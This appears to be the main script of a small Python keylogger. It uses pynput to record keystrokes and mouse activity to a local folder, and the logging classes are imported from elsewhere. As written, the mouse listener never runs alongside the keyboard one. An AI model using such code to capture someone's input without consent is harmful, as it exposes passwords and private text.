from pynput import keyboard, mouse
from klasy import KeyLogger, MouseLogger

if __name__ == "__main__":
    log_dir = "D:\\logi\\"
    keylogger = KeyLogger(log_dir)
    mouselogger = MouseLogger(log_dir)

    with keyboard.Listener(on_press=keylogger.on_press, on_release=keylogger.on_release) as listener:
        listener.join()

    with mouse.Listener(on_move=mouselogger.on_move, on_click=mouselogger.on_click, on_scroll=mouselogger.on_scroll) as listener:
        listener.join()